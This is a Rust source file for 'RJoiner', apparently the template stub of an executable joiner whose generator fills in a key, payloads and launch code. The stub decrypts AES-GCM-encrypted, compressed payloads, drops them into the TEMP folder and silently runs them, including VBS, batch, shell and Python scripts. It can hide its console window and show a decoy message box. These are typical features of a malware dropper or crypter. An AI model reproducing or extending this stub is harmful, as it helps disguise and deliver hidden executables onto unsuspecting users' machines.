/*
    RJoiner to join executables
    Copyright (C) 2023  ftdot

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

#![allow(dead_code)]
#![allow(non_snake_case)]

//--win-subsys--

use std::process::Command;
use std::fs;
use std::path::PathBuf;

use aes_gcm::{
    aead::{Aead, KeyInit},
    Aes256Gcm, Nonce
};
use base64::{Engine as _, engine::general_purpose};

// Constants

static KEY: &'static [u8] = b"--key--";

static TEMP_DIR: &'static str = env!("TEMP");

// Functions

fn decrypt_content(nonce: &[u8], content: &[u8], key: &[u8]) -> Option<Vec<u8>> {

    let content_ = match general_purpose::STANDARD_NO_PAD.decode(content) {
        #[allow(unused_variables)]
        Err(e) => { #[cfg(debug_assertions)] println!("Error while base64 decoding: {}", e); return None; }
        Ok(r) => { r }
    };

    let nonce_vec = match general_purpose::STANDARD_NO_PAD.decode(nonce) {
        #[allow(unused_variables)]
        Err(e) => { #[cfg(debug_assertions)] println!("Error while getting nonce: {}", e); return None; }
        Ok(r) => { r }
    };

    let nonce_ = nonce_vec.as_slice();

    let cipher = match Aes256Gcm::new_from_slice(key) {
        #[allow(unused_variables)]
        Err(e) => { #[cfg(debug_assertions)] println!("Error while initializing cipher: {}", e); return None; }
        Ok(r) => { r }
    };

    match cipher.decrypt(Nonce::from_slice(nonce_), content_.as_ref()) {
        #[allow(unused_variables)]
        Err(e) => { #[cfg(debug_assertions)] println!("Error while decrypting data: {}", e); None }
        Ok(r) => { Some(r) }
    }
}

fn decrypt_n_drop(filename: &str, nonce: &[u8], content: &[u8], key: &[u8]) -> bool {

    let path = PathBuf::from(TEMP_DIR).join(filename);

    #[cfg(debug_assertions)] println!("Decrypt and drop file {} by path {}", filename, path.display());

    let content_dec = match decrypt_content(nonce, content, key) {
        Some(r) => { r }
        None => { #[cfg(debug_assertions)] println!("Cannot decrypt content"); return false; }
    };

    let content_unzip = match unzip(content_dec.as_slice()) {
        Some(r) => { r }
        None => { #[cfg(debug_assertions)] println!("Cannot decompress data"); return false; }
    };

    match fs::write(&path, content_unzip) {
        #[allow(unused_variables)]
        Err(e) => { #[cfg(debug_assertions)] println!("Error while file write out: {}", e); return false; }
        Ok(_) => {}
    };

    let extension = match path.extension() {
        Some(s) => {
            match s.to_str() {
                Some(r) => { r }
                None => { #[cfg(debug_assertions)] println!("Error while converting OsStr to str"); return false; }
            }
        }
        None => { #[cfg(debug_assertions)] println!("Error while getting extension"); return false; }
    };

    let command = if extension == "vbs" && cfg!(target_os="windows") {
        match path.to_str() {
            Some(r) => { "wscript \"".to_owned() + r + "\"" }
            None => { #[cfg(debug_assertions)] println!("Error while converting OsStr to str"); return false; }
        }
    } else if extension == "bat" && cfg!(target_os="windows") {
        match path.to_str() {
            Some(r) => { "cmd /c \"".to_owned() + r + "\"" }
            None => { #[cfg(debug_assertions)] println!("Error while converting OsStr to str"); return false; }
        }
    } else if extension == "sh" && cfg!(target_os="linux") {
        match path.to_str() {
            Some(r) => { "sh \"".to_owned() + r + "\"" }
            None => { #[cfg(debug_assertions)] println!("Error while converting OsStr to str"); return false; }
        }
    } else if extension == "py" && cfg!(target_os="linux") {
        match path.to_str() {
            Some(r) => { "python3 \"".to_owned() + r + "\"" }
            None => { #[cfg(debug_assertions)] println!("Error while converting OsStr to str"); return false; }
        }
    } else {
        match path.to_str() {
            Some(r) => { r.to_owned() }
            None => { #[cfg(debug_assertions)] println!("Error while converting OsStr to str"); return false; }
        }
    };

    match Command::new(command).spawn() {
        Ok(_) => {}
        #[allow(unused_variables)]
        Err(e) => { #[cfg(debug_assertions)] println!("Error while running process {}", e); return false; }
    };

    #[cfg(debug_assertions)] println!("file {} run!", filename);

    true
}

fn unzip(data: &[u8]) -> Option<Vec<u8>> {
    match yazi::decompress(&data, yazi::Format::Zlib) {
        Ok(r) => { Some(r.0) }
        #[allow(unused_variables)]
        Err(e) => { #[cfg(debug_assertions)] println!("Error while data decompressing: {:?}", e); None }
    }
}

#[cfg(feature="show_messagebox")]
#[allow(unused_must_use)]
fn show_message() {
    msgbox::create("--messagebox-title--", "--messagebox-text--", msgbox::IconType::SHOW_MESSAGEBOX_TYPE);
}

fn main() {
    #[cfg(feature="show_messagebox")]
    show_message();

    let key_vec = match general_purpose::STANDARD_NO_PAD.decode(KEY) {
        #[allow(unused_variables)]
        Err(e) => { #[cfg(debug_assertions)] println!("Error while base64 decoding key: {}", e); return; }
        Ok(r) => { r }
    };
    #[allow(unused_variables)]
    let key = key_vec.as_slice();
    //--gen-code--
}
